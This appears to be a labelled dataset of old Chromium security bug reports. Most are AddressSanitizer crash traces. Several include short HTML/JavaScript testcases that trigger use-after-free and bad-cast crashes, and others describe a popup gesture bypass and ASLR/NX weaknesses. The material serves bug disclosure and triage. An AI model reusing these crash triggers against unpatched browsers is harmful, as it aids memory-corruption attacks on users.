mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/bindings/v8/scheduledaction.cpp:103 29 in fired mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/page/domtimer.cpp:160 previously allocated by thread t0 chrome here 0 in interceptor_malloc asan_rtl 1 in createanonymous mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/rendering/renderblock.cpp:245 2 in createanonymousblock mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/rendering/renderblock.h:271 3 in addchildignoringanonymouscolumnblocks mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/rendering/renderblock.cpp:887 4 in createrendererforelementifneeded mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/dom/noderenderingcontext.cpp:275 5 in createrendererifneeded mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/dom/element.cpp:1298 6 in reattach mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/dom/node.h:913 7 in recalcstyle mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/dom/element.cpp:1522 8 in recalcstyle mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/dom/element.cpp:1522 9 in recalcstyle mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/dom/element.cpp:1522 10 in recalcstyle mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/dom/document.cpp:1706 11 in updatestyleifneeded mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/dom/document.cpp:1753 12 in checkcompleted mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/loader/frameloader.cpp:709 13 in finishedparsing mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/loader/frameloader.cpp:642 14 in finishedparsing mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/dom/document.cpp:4157 15 in end mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:725 16 in processparsedchunkfrombackgroundparser mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:431 17 in pumppendingspeculations mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:461 18 in didreceiveparsedchunkfrombackgroundparser mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:311 19 in passownptr mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/wtf/functional.h:210 20 in operator mnt/scratch0/tmpbuild/src/out/release third_party/webkit/source/wtf/functional.h:577 21 in run mnt/scratch0/tmpbuild/src/out/release base/callback.h:396 22 in deferorrunpendingtask mnt/scratch0/tmpbuild/src/out/release base/message_loop/message_loop.cc:496 23 in dowork mnt/scratch0/tmpbuild/src/out/release base/message_loop/message_loop.cc:688 24 in run mnt/scratch0/tmpbuild/src/out/release base/message_loop/message_pump_default.cc:29 25 in runinternal mnt/scratch0/tmpbuild/src/out/release base/message_loop/message_loop.cc:441 26 in run mnt/scratch0/tmpbuild/src/out/release base/run_loop.cc:45 27 in run mnt/scratch0/tmpbuild/src/out/release base/message_loop/message_loop.cc:321 28 in renderermain mnt/scratch0/tmpbuild/src/out/release content/renderer/renderer_main.cc:236 29 in runzygote mnt/scratch0/tmpbuild/src/out/release content/app/content_main_runner.cc:385 shadow bytes around the buggy address fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 asan internal fe	11
javascript execution bug introduced with chrome 29.0.1547.57 chrome version 29.0.1547.57 urls if applicable none other browsers tested safari 6 ok firefox 20 ok ie 8/9/10 ok chrome 29.0.1547.62 fail chrome 29.0.1547.57 and 62 if code is stepped through in debugger ok what steps will reproduce the problem 1 open the attached file chrometest.html in chrome 29 this file contains a javascript function that recursively wraps any non-function properties of an object with a function expression function return value it then tests the returned object with some assertions to see if the mapped object contains the expected values what is the expected result all assertions should pass they do on ff ie and safari they also do in chrome 29 if you step through the code in the debugger only if you let it run does it display the issue optimization and/or jit bug what happens instead two of the assertions fail regarding a property b that was a function to start with but which is now mysteriously set to the value of the next property processed and that next property c which becomes undefined discussion/discovery we were contacted by our users saying several applications we wrote using knockout.js had started failing after chrome autoupdated to version 29.0.1547.57 after some probing we found that the specific problem was with knockout s mapping plugin if you re not familiar with that plugin it recursively converts the properties of an object to knockout s ko.observable type so that they may be bound to the dom with chrome 29 some of the properties were being scrambled coming back with values from different properties and some were coming back undefined the plugin works correctly in all other browsers which we have tested we started paring down the plugin until we could find the smallest case that would repro the issue which is the attached file also attached is a screenshot of a chrome dev tools session showing where the assertions fail	11
heap-use-after-free in void url_parse tested on os ubuntu 12.04 chromium asan 31.0.1623.0 developer build 221367 asan-report 19960==error addresssanitizer stack-buffer-overflow on address at pc bp sp read of size 1 at thread t0 chrome 0 in void url_parse anonymous namespace parseserverinfo char char const url_parse component const url_parse component url_parse component b/build/slave/asan_release__symbolized_/build/src/out/release url/third_party/mozilla/url_parse.cc:110:0 1 in void url_parse anonymous namespace doparseauthority char char const url_parse component const url_parse component url_parse component url_parse component url_parse component b/build/slave/asan_release__symbolized_/build/src/out/release url/third_party/mozilla/url_parse.cc:174:0 2 in void url_parse anonymous namespace doparseafterscheme char char const int int url_parse parsed b/build/slave/asan_release__symbolized_/build/src/out/release url/third_party/mozilla/url_parse.cc:310:0 3 in bool url_canon anonymous namespace doresolverelativehost char char const url_parse parsed const char const url_parse component const url_canon charsetconverter url_canon canonoutputt char url_parse parsed b/build/slave/asan_release__symbolized_/build/src/out/release url/url_canon_relative.cc:375:0 4 in bool url_canon anonymous namespace doresolverelativeurl char char const url_parse parsed const bool char const url_parse component const url_canon charsetconverter url_canon canonoutputt char url_parse parsed b/build/slave/asan_release__symbolized_/build/src/out/release url/url_canon_relative.cc:491:0 5 in bool url_util anonymous namespace doresolverelative char char const int url_parse parsed const char const int url_canon charsetconverter url_canon canonoutputt char url_parse parsed b/build/slave/asan_release__symbolized_/build/src/out/release url/url_util.cc:262:0 repro-file as attachment i also added original repro-file because it causes a crash with nearly same stack trace but type is use-after-free	11
heap-use-after-free in wtf keyvaluepair webcore resource wtf refptr webcore resourcetiminginfo keyvaluepair heap-use-after-free in resourceloader please note that following test case was only working on trunk 221367 i ve observed many uafs with the similar crash call-stacks on stable and beta but i do n't have simplified test cases for that so i hope this test-case would be enough to confirm otherwise i will work on the testcases for stable and beta as well version chrome version 29.0.1547.65 stable 29.0.1547.57 beta trunk 221367 operating system debian 7.1 reproduction case html head script src ajax.googleapis.com/ajax/libs/angularjs/1.0.7/angular.min.js script script src ajax.googleapis.com/ajax/libs/chrome-frame/1.0.3/cfinstall.min.js script script src ajax.googleapis.com/ajax/libs/dojo/1.9.1/dojo/dojo.js script script performance.onwebkitresourcetimingbufferfull function window.stop performance.webkitsetresourcetimingbuffersize 3 script head html for crashes please include the following additional information 7538==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 chrome 0 in refptr third_party/webkit/source/wtf/refptr.h:50 1 in deletebucket third_party/webkit/source/wtf/hashtable.h:345 2 in remove third_party/webkit/source/wtf/hashtable.h:825 3 in remove third_party/webkit/source/wtf/hashtable.h:839 4 in didloadresource third_party/webkit/source/core/fetch/resourcefetcher.cpp:938 5 in releaseresources third_party/webkit/source/core/fetch/resourceloader.cpp:91 6 in didfinishloading third_party/webkit/source/core/fetch/resourceloader.cpp:359 7 in oncompletedrequest webkit/child/weburlloader_impl.cc:726 8 in onrequestcomplete content/child/resource_dispatcher.cc:547 9 in dispatch content resourcedispatcher content resourcedispatcher void content resourcedispatcher int int bool const std basic_string char const base timeticks content/common/resource_messages.h:264 10 in dispatchmessage content/child/resource_dispatcher.cc:658 11 in onmessagereceived content/child/resource_dispatcher.cc:313 12 in onmessagereceived content/child/child_thread.cc:314 13 in ondispatchmessage ipc/ipc_channel_proxy.cc:264 14 in makeitso base/bind_internal.h:898 15 in runtask base/message_loop/message_loop.cc:486 16 in deferorrunpendingtask base/message_loop/message_loop.cc:498 17 in dowork base/message_loop/message_loop.cc:612 18 in run base/message_loop/message_pump_default.cc:32 19 in runinternal base/message_loop/message_loop.cc:436 20 in run base/run_loop.cc:45 21 in run base/message_loop/message_loop.cc:307 22 in renderermain content/renderer/renderer_main.cc:252 23 in runzygote content/app/content_main_runner.cc:397 24 in runnamedprocesstypemain content/app/content_main_runner.cc:466 25 in run content/app/content_main_runner.cc:778 26 in contentmain content/app/content_main.cc:35 27 in chromemain chrome/app/chrome_main.cc:39 28 in main chrome/app/chrome_exe_main_gtk.cc:43 29 in 0 30 in start 0 is located 40 bytes inside of 64-byte region freed by thread t0 chrome here 0 in interceptor_free asan_rtl 1 in remove third_party/webkit/source/wtf/hashtable.h:839 2 in didloadresource third_party/webkit/source/core/fetch/resourcefetcher.cpp:938 3 in releaseresources third_party/webkit/source/core/fetch/resourceloader.cpp:91 4 in cancel third_party/webkit/source/core/fetch/resourceloader.cpp:211 5 in cancel third_party/webkit/source/core/fetch/resourceloader.cpp:202 addr2line no such file 6 in cancelall third_party/webkit/source/core/fetch/resourceloaderset.cpp:44 7 in stoploading third_party/webkit/source/core/loader/documentloader.cpp:246 8 in stopallloaders third_party/webkit/source/core/loader/frameloader.cpp:849 9 in stopmethodcallback b/build/slave/asan_release__symbolized_/build/src/out/release/gen/blink/bindings/v8window.cpp:5951 10 in call v8/src/arguments.cc:56 11 in handleapicallhelper false v8/src/builtins.cc:1272 12 in builtin_handleapicall v8/src/builtins.cc:1288 13 in 14 in 15 in 16 in 17 in 18 in invoke v8/src/execution.cc:119 19 in call v8/src/api.cc:4235 20 in callfunction third_party/webkit/source/bindings/v8/v8scriptrunner.cpp:131 21 in callfunctionwithinstrumentation third_party/webkit/source/bindings/v8/scriptcontroller.cpp:203 22 in callfunction third_party/webkit/source/bindings/v8/scriptcontroller.cpp:159 23 in calllistenerfunction third_party/webkit/source/bindings/v8/v8eventlistener.cpp:92 24 in invokeeventhandler third_party/webkit/source/bindings/v8/v8abstracteventlistener.cpp:134 25 in handleevent third_party/webkit/source/bindings/v8/v8abstracteventlistener.cpp:94 26 in fireeventlisteners third_party/webkit/source/core/dom/eventtarget.cpp:319 27 in fireeventlisteners third_party/webkit/source/core/dom/eventtarget.cpp:268 28 in dispatchevent third_party/webkit/source/core/dom/eventtarget.cpp:176 29 in addresourcetimingbuffer third_party/webkit/source/core/page/performance.cpp:243 previously allocated by thread t0 chrome here 0 in interceptor_malloc asan_rtl 1 in fastzeroedmalloc third_party/webkit/source/wtf/fastmalloc.cpp:191 2 in rehash third_party/webkit/source/wtf/hashtable.h:916 3 in remove third_party/webkit/source/wtf/hashtable.h:839 4 in didloadresource third_party/webkit/source/core/fetch/resourcefetcher.cpp:938 5 in releaseresources third_party/webkit/source/core/fetch/resourceloader.cpp:91 6 in didfinishloading third_party/webkit/source/core/fetch/resourceloader.cpp:359 7 in oncompletedrequest webkit/child/weburlloader_impl.cc:726 8 in onrequestcomplete content/child/resource_dispatcher.cc:547 9 in dispatch content resourcedispatcher content resourcedispatcher void content resourcedispatcher int int bool const std basic_string char const base timeticks content/common/resource_messages.h:264 10 in dispatchmessage content/child/resource_dispatcher.cc:658 11 in onmessagereceived content/child/resource_dispatcher.cc:313 12 in onmessagereceived content/child/child_thread.cc:314 13 in ondispatchmessage ipc/ipc_channel_proxy.cc:264 14 in makeitso base/bind_internal.h:898 15 in runtask base/message_loop/message_loop.cc:486 16 in deferorrunpendingtask base/message_loop/message_loop.cc:498 17 in dowork base/message_loop/message_loop.cc:612 18 in run base/message_loop/message_pump_default.cc:32 19 in runinternal base/message_loop/message_loop.cc:436 20 in run base/run_loop.cc:45 21 in run base/message_loop/message_loop.cc:307 22 in renderermain content/renderer/renderer_main.cc:252 23 in runzygote content/app/content_main_runner.cc:397 24 in runnamedprocesstypemain content/app/content_main_runner.cc:466 25 in run content/app/content_main_runner.cc:778 26 in contentmain content/app/content_main.cc:35 27 in chromemain chrome/app/chrome_main.cc:39 28 in main chrome/app/chrome_exe_main_gtk.cc:43 29 in 0 shadow bytes around the buggy address 00 00 00 01 fa fa fa fa 00 00 00 00 00 00 00 fa fa fa fa fa fd fd fd fd fd fd fd fd fa fa fa fa fd fd fd fd fd fd fd fa fa fa fa fa fd fd fd fd fd fd fd fd fa fa fa fa fd fd fd fd fd fd fd fa fa fa fa fa fd fd fd fd fd fd fd fd fa fa fa fa fd fd fd fd fd fd fd fd fa fa fa fa fd fd fd fd fd fd fd fd fa fa fa fa fd fd fd fd fd fd fd fd fa fa fa fa fd fd fd fd fd fd fd fd fa fa fa fa fd fd fd fd fd fd fd fd fa fa fa fa fd fd fd fd fd fd fd fa fa fa fa fa fd fd fd fd fd fd fd fd fa fa fa fa fd fd fd fd fd fd fd fd fa fa fa fa shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 asan internal fe 7538==aborting this is the asan dump from stable 29.0.1547.65 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 chrome 0 in deletebucket third_party/webkit/source/wtf/refptr.h:51 1 in removeandinvalidatewithoutentryconsistencycheck third_party/webkit/source/wtf/hashtable.h:1008 2 in releaseresources third_party/webkit/source/core/loader/resourceloader.cpp:91 3 in didfinishloading third_party/webkit/source/core/loader/resourceloader.cpp:389 4 in oncompletedrequest webkit/glue/weburlloader_impl.cc:729 5 in onrequestcomplete content/child/resource_dispatcher.cc:514 6 in dispatchtomethod content resourcedispatcher void content resourcedispatcher int int bool const std basic_string char const base timeticks int int bool std basic_string char base timeticks base/tuple.h:571 7 in onmessagereceived content/child/resource_dispatcher.cc:306 is located 360 bytes inside of 512-byte region freed by thread t0 chrome here 0 in interceptor_free asan_rtl 1 in removeandinvalidatewithoutentryconsistencycheck third_party/webkit/source/wtf/hashtable.h:1008 2 in releaseresources third_party/webkit/source/core/loader/resourceloader.cpp:91 3 in cancel third_party/webkit/source/core/loader/resourceloader.cpp:225 4 in cancel third_party/webkit/source/core/loader/resourceloader.cpp:216 5 in cancelall third_party/webkit/source/core/loader/documentloader.cpp:78 6 in stoploadingsubresources third_party/webkit/source/core/loader/documentloader.cpp:900 previously allocated by thread t0 chrome here 0 in interceptor_malloc asan_rtl 1 in allocatetable third_party/webkit/source/wtf/hashtable.h:1079 2 in expand third_party/webkit/source/wtf/hashtable.h:1108 3 in inlineadd third_party/webkit/source/wtf/hashmap.h:342 4 in loadresource third_party/webkit/source/core/loader/cache/cachedresourceloader.cpp:678 5 in requestresource third_party/webkit/source/core/loader/cache/cachedresourceloader.cpp:453	11
heap-use-after-free in webcore node containsincludinghostelements vulnerability details references to a template s content are not freed when the template is destroyed interacting with the template s document fragment such as appending a child causes a crash on the latest available asan prebuild currently crashes on a read but i suspect i can change that given a little time i wanted to get this posted though as the trigger is very simple and i wanted to get in before the masses version chrome version 29.0.1547.57 operating system debian wheezy reproduction case a minimized testcase is attached for ease of reproduction enable the use of window.gc in the js flags a full symbolized asan output is also attached	11
heap-use-after-free in webcore elementshadow removeallshadowroots detailed report fuzzer inferno_twister_custom_bundle crash type heap-use-after-free read 8 crash address crash state crash stack webcore elementshadow removeallshadowroots webcore element element free stack webcore node node webcore attr attr regressed minimized testcase 7.10 kb	11
assertion failed run.characterslength run.length heap-buffer-overflow in webcore font characterrangecodepath detailed report fuzzer inferno_twister crash type heap-buffer-overflow read 2 crash address crash state crash stack webcore font characterrangecodepath webcore font drawtext webcore svginlinetextbox painttextwithshadows regressed minimized testcase 0.76 kb download script if window.testrunner testrunner.dumpastext false onload function tspanelement document.getelementbyid tspaninfirstroot tspanelement.appendchild document.createtextnode unescape ufe9e ue28f ue47e document.body.offsettop document.body.style.zoom=0.9 document.designmode='on useelement document.getelementbyid useelement window.getselection setbaseandextent filterinfirstroot useelement 5 document.execcommand forwarddelete script svg text direction=rtl id=filterinfirstroot tspan id=tspaninfirstroot text path filter=url filterinsecondroot svg svg xmlns filter id=filterinsecondroot	11
assert isdocumentlifecycleobserver asan sigsegv unknown in webcore documentlifecyclenotifier notifydocumentwasdisposed detailed report uploader inferno chromium.org job type linux_asan_chrome_bad_cast crash type unknown crash address crash state crash stack webcore documentlifecyclenotifier notifydocumentwasdisposed webcore treescope removedlastreftoscope webcore updatetreeafterinsertion unminimized testcase	11
heap-buffer-overflow in office doc bxpap init detailed report fuzzer jorgelo_qo_doc_reliability job type qo_dcp_test crash type heap-buffer-overflow read 1 crash address crash state crash stack office doc bxpap init office doc bxpap bxpap office doc papxfkp init minimized testcase 32.00 kb	11
security work around user gesture requirement vulnerability details a malicious website can launch two popups per click see e.g version chrome version m30 operating system all reproduction case the code creates the first window in the mouse down event then creates a transparent iframe covering the entire page and then creates the second window in the mouseup handler since the mouse up and mouse down events are handled in different frames we fail to connect the two events via one usergesturetoken	11
security ensure that all request types use pinning sleevi says my wager is 50/50 given that i suspect way too much crap is using the systemurlrequestcontext which does n't have a profile tagged to it and thus may not have a tss or a fraudulentcertreporter tied to it i d say that preloaded sts/pins can and should apply even if there is no other tss right	11
security mach_override_ptr maps rwx pages at fixed address and leaves prot_write on text pages mach_override is a third_party dep used for function hooking specifically it is used to work around issues with multilanguage input by hooking tiscreateinputsourcelist cflog is also hooked to discard certain error messages related to this malloc_error_break is also hooked to crash with a errno dereference mach_override_ptr performs the function hooking by disassembling the function prologue to ensure the function is long enough to insert a jmp then vm_protect-ing the page containing the function to make it writable and inserting a jump to a escapeisland page mach_override s term where a jmp instruction to the replacement function is written these escapeislands are allocated page by page starting at the fixed address these pages are marked rwx neither the escapeislands nor hooked functions have the prot_write remove after it s set up the risks imposed by this at the moment are severe 1 aslr defeat there is a relative jump instruction at a fixed address to the replacement function in google chrome helper allowing an attacker to determine the base address of a dylib 2 nx defeat rwx memory is mapped at a known location in the short term we should patch mach_override_ptr to remove prot_write after the code has been patched and the trampolines have been constructed we should also not have the escapeislands at a fixed address long term we should investigate using the interpose functionality of dyld to perform this hooking without relying on a third party library patch following	11
heap-use-after-free in webcore document updatelayout detailed report fuzzer ifratric-browserfuzzer-v3 job type linux_asan_chrome_mp crash type heap-use-after-free write 1 crash address crash state crash stack webcore document updatelayout webcore svguseelement instanceroot free stack webcore widgethierarchyupdatessuspensionscope movewidgets webcore containernode removechildren regressed minimized testcase 0.96 kb	11
fileapimessagefilter onopenfile opens files with greater permissions than checked an excerpt from fileapi_message_filter.cc void fileapimessagefilter onopenfile int request_id const gurl path int file_flags const int open_permissions base platform_file_open file_flags fileapi kopenfilepermissions filesystemurl url context crackurl path if haspermissionsforfile url open_permissions error send new filesystemmsg_didfail request_id error return operations request_id operation_runner openfile url file_flags peerhandle base bind fileapimessagefilter didopenfile this request_id quota_policy the thing to notice is that the code checks for open_permissions which is bitwise anded with kopenfilepermissions and actually opens the file with the original file_flags argument this could be a bug this bug also is what allows pp_fileopenflag_append to function if you simply change file_flags to open_flags in the openfile call pepper s append functionality breaks some references plan to refactor childprocesssecuritypolicy discussion of this issue in the comments msg11	11
heap-use-after-free in content quotadispatcherhost requestquotadispatcher didfinish detailed report fuzzer aedla_ipc_fuzzer job type linux_asan_chrome_ipc crash type heap-use-after-free read 8 crash address crash state crash stack content quotadispatcherhost requestquotadispatcher didfinish content quotadispatcherhost requestquotadispatcher didgetpermissionresponse free stack ipc channelproxy context onchannelclosed base messageloop runtask	11
heap-use-after-free in webcore cssfontselector dispatchinvalidationcallbacks detailed report fuzzer inferno_twister_custom_bundle job type linux_asan_chrome_mp crash type heap-use-after-free read 8 crash address crash state crash stack webcore cssfontselector dispatchinvalidationcallbacks webcore cssfontface fontloaded free stack wtf vector webcore canvasrenderingcontext2d state 1ul expandcapacity webcore canvasrenderingcontext2d realizesavesloop minimized testcase 2598.44 kb	11
use-after-free on content gpuvideodecodeacceleratorhost onerrornotification this crash has been found by the last syzyasan canary 30.0.1576.1 we ve seen it 54 times you can go to to get more information about how to treat this bug error type write of size 4 alloc_stack 62 void alloc_stack_size alloc_tid free_stack 62 void free_stack_size free_tid error_type 2 use_after_free access_mode 1 asan_write_access access_size 4 shadow_info 128 050bad4b is 27 bytes inside 32-byte block 050bad30,050bad50 microseconds_since_free stack trace of the crash chrome content gpuvideodecodeacceleratorhost onerrornotification c b\build\slave\win-asan\build\src\content\common\gpu\client\gpu_video_decode_accelerator_host.cc 224 chrome speechrecognitionmsg_audiostarted dispatch content speechrecognitiondispatcher content speechrecognitiondispatcher void thiscall content speechrecognitiondispatcher int c b\build\slave\win-asan\build\src\content\common\speech_recognition_messages.h 158 chrome content gpuvideodecodeacceleratorhost onmessagereceived c b\build\slave\win-asan\build\src\content\common\gpu\client\gpu_video_decode_accelerator_host.cc 62 chrome base internal invokehelper 1 void base internal runnableadapter void thiscall content pepperinprocessrouter ipc message void cdecl base weakptr content pepperinprocessrouter const ipc message makeitso c b\build\slave\win-asan\build\src\base\bind_internal.h 909 chrome base internal invoker 2 base internal bindstate base internal runnableadapter void thiscall content webpluginproxy gfx rect const void cdecl content webpluginproxy gfx rect const void cdecl base weakptr content webpluginproxy gfx rect void cdecl content webpluginproxy gfx rect const run c b\build\slave\win-asan\build\src\base\bind_internal.h 1253 chrome base messageloop runtask c b\build\slave\win-asan\build\src\base\message_loop\message_loop.cc 480 chrome base messageloop dowork c b\build\slave\win-asan\build\src\base\message_loop\message_loop.cc 605 chrome base messagepumpdefault run c b\build\slave\win-asan\build\src\base\message_loop\message_pump_default.cc 33 chrome base messageloop runinternal c b\build\slave\win-asan\build\src\base\message_loop\message_loop.cc 433 chrome base runloop run c b\build\slave\win-asan\build\src\base\run_loop.cc 46 chrome base thread run c b\build\slave\win-asan\build\src\base\threading\thread.cc 158 chrome base thread threadmain c b\build\slave\win-asan\build\src\base\threading\thread.cc 207 chrome base anonymous namespace threadfunc c b\build\slave\win-asan\build\src\base\threading\platform_thread_win.cc 78 kernel32 basethreadinitthunk ntdll rtluserthreadstart ntdll rtluserthreadstart allocation stack trace asan_rtl agent asan heapproxy alloc e b\build\slave\syzygy_official\build\src\syzygy\agent\asan\asan_heap.cc 216 asan_rtl asan_heapalloc e b\build\slave\syzygy_official\build\src\syzygy\agent\asan\asan_rtl_impl.cc 100 chrome generic_cpp_alloc c b\build\slave\win-asan\build\src\base\allocator\generic_allocators.cc 16 chrome operator new c b\build\slave\win-asan\build\src\base\allocator\generic_allocators.cc 29 chrome content commandbufferproxyimpl createvideodecoder c b\build\slave\win-asan\build\src\content\common\gpu\client\command_buffer_proxy_impl.cc 498 chrome content gpuchannelhost createvideodecoder c b\build\slave\win-asan\build\src\content\common\gpu\client\gpu_channel_host.cc 184 chrome content renderergpuvideodecoderfactories asynccreatevideodecodeaccelerator c b\build\slave\win-asan\build\src\content\renderer\media\renderer_gpu_video_decoder_factories.cc 105 chrome content renderergpuvideodecoderfactories createvideodecodeaccelerator c b\build\slave\win-asan\build\src\content\renderer\media\renderer_gpu_video_decoder_factories.cc 75 chrome media gpuvideodecoder initialize c b\build\slave\win-asan\build\src\media\filters\gpu_video_decoder.cc 152 chrome media videodecoderselector initializedecoder c b\build\slave\win-asan\build\src\media\filters\video_decoder_selector.cc 125 chrome media videodecoderselector selectvideodecoder c b\build\slave\win-asan\build\src\media\filters\video_decoder_selector.cc 55 chrome media videoframestream initialize c b\build\slave\win-asan\build\src\media\filters\video_frame_stream.cc 54 chrome media videorendererbase initialize c b\build\slave\win-asan\build\src\media\filters\video_renderer_base.cc 175 chrome media pipeline initializevideorenderer c b\build\slave\win-asan\build\src\media\base\pipeline.cc 921 chrome media pipeline statetransitiontask c b\build\slave\win-asan\build\src\media\base\pipeline.cc 436 chrome base internal invoker 2 base internal bindstate base internal runnableadapter void thiscall rlztracker enum rlz_lib accesspoint void cdecl rlztracker enum rlz_lib accesspoint void cdecl base internal unretainedwrapper rlztracker enum rlz_lib accesspoint void cdecl rlztracker enum rlz_lib accesspoint run c b\build\slave\win-asan\build\src\base\bind_internal.h 1254 chrome base messageloop runtask c b\build\slave\win-asan\build\src\base\message_loop\message_loop.cc 480 chrome base messageloop dowork c b\build\slave\win-asan\build\src\base\message_loop\message_loop.cc 605 chrome base messagepumpdefault run c b\build\slave\win-asan\build\src\base\message_loop\message_pump_default.cc 33 chrome base messageloop runinternal c b\build\slave\win-asan\build\src\base\message_loop\message_loop.cc 433 chrome base runloop run c b\build\slave\win-asan\build\src\base\run_loop.cc 46 chrome base thread run c b\build\slave\win-asan\build\src\base\threading\thread.cc 158 chrome base thread threadmain c b\build\slave\win-asan\build\src\base\threading\thread.cc 207 chrome base anonymous namespace threadfunc c b\build\slave\win-asan\build\src\base\threading\platform_thread_win.cc 78 kernel32 basethreadinitthunk ntdll rtluserthreadstart ntdll rtluserthreadstart free stack trace asan_rtl agent asan heapproxy free e b\build\slave\syzygy_official\build\src\syzygy\agent\asan\asan_heap.cc 269 asan_rtl asan_heapfree e b\build\slave\syzygy_official\build\src\syzygy\agent\asan\asan_rtl_impl.cc 128 chrome operator delete c b\build\slave\win-asan\build\src\base\allocator\allocator_shim.cc 157 chrome content gpuvideodecodeacceleratorhost scalar deleting destructor chrome content gpuvideodecodeacceleratorhost destroy c b\build\slave\win-asan\build\src\content\common\gpu\client\gpu_video_decode_accelerator_host.cc 134 chrome media gpuvideodecoder destroyvda c b\build\slave\win-asan\build\src\media\filters\gpu_video_decoder.cc 187 chrome media gpuvideodecoder notifyerror c b\build\slave\win-asan\build\src\media\filters\gpu_video_decoder.cc 576 chrome content gpuvideodecodeacceleratorhost onerrornotification c b\build\slave\win-asan\build\src\content\common\gpu\client\gpu_video_decode_accelerator_host.cc 224 chrome speechrecognitionmsg_audiostarted dispatch content speechrecognitiondispatcher content speechrecognitiondispatcher void thiscall content speechrecognitiondispatcher int c b\build\slave\win-asan\build\src\content\common\speech_recognition_messages.h 158 chrome content gpuvideodecodeacceleratorhost onmessagereceived c b\build\slave\win-asan\build\src\content\common\gpu\client\gpu_video_decode_accelerator_host.cc 62 chrome base internal invokehelper 1 void base internal runnableadapter void thiscall content pepperinprocessrouter ipc message void cdecl base weakptr content pepperinprocessrouter const ipc message makeitso c b\build\slave\win-asan\build\src\base\bind_internal.h 909 chrome base internal invoker 2 base internal bindstate base internal runnableadapter void thiscall content webpluginproxy gfx rect const void cdecl content webpluginproxy gfx rect const void cdecl base weakptr content webpluginproxy gfx rect void cdecl content webpluginproxy gfx rect const run c b\build\slave\win-asan\build\src\base\bind_internal.h 1253 chrome base messageloop runtask c b\build\slave\win-asan\build\src\base\message_loop\message_loop.cc 480 chrome base messageloop dowork c b\build\slave\win-asan\build\src\base\message_loop\message_loop.cc 605 chrome base messagepumpdefault run c b\build\slave\win-asan\build\src\base\message_loop\message_pump_default.cc 33 chrome base messageloop runinternal c b\build\slave\win-asan\build\src\base\message_loop\message_loop.cc 433 chrome base runloop run c b\build\slave\win-asan\build\src\base\run_loop.cc 46 chrome base thread run c b\build\slave\win-asan\build\src\base\threading\thread.cc 158 chrome base thread threadmain c b\build\slave\win-asan\build\src\base\threading\thread.cc 207 chrome base anonymous namespace threadfunc c b\build\slave\win-asan\build\src\base\threading\platform_thread_win.cc 78 kernel32 basethreadinitthunk ntdll rtluserthreadstart ntdll rtluserthreadstart	11
assert bad cast from cssinitialvalue to cssvaluelist unknown in webcore cssvalue iscfcssvaluelist detailed report fuzzer bj_doc_fuzzer job type linux_asan_chrome_bad_cast crash type unknown crash address crash state crash stack webcore cssparser parsefontfacevalue webcore cssvaluepool createfontfacevalue webcore htmlfontelement collectstyleforpresentationattribute minimized testcase 0.41 kb	11
assertion failed element element hastagname summarytag unknown in webcore detailsmarkercontrol summaryelement vulnerability details bad cast in detailmarkercontrol summaryelement in source/core/html/shadow/detailmarkercontrol.cpp it assumes the shadow host is always summary but there is a way to change the shadow host version chrome version stable operating system all reproduction case load the following html no user-interaction is needed summary summary summary script var summary document.queryselector summary var sr1 summary.webkitcreateshadowroot sr1.innerhtml div shadow shadow div var div sr1.firstchild var sr2 div.webkitcreateshadowroot sr2.innerhtml content select div content var marker sr2.firstchild.getdistributednodes 0 console.log ua shadow node marker sr2.appendchild marker script	11
heap-use-after-free in webcore audiobuffersourcenode renderfrombuffer vulnerability details an arraybuffer used by web audio can be posted to a web worker when the arraybuffer is neutered then web audio might still access the neutered memory repro see for more details this potentially could result in a crash although one has not been observed	11
heap-use-after-free in webcore htmlformcontrolscollectionv8internal indexedpropertygettercallback see attached reproduction requires expose-gc i ve only tested in m30 dev but this bug has likely been around forever working on fixing this now	11
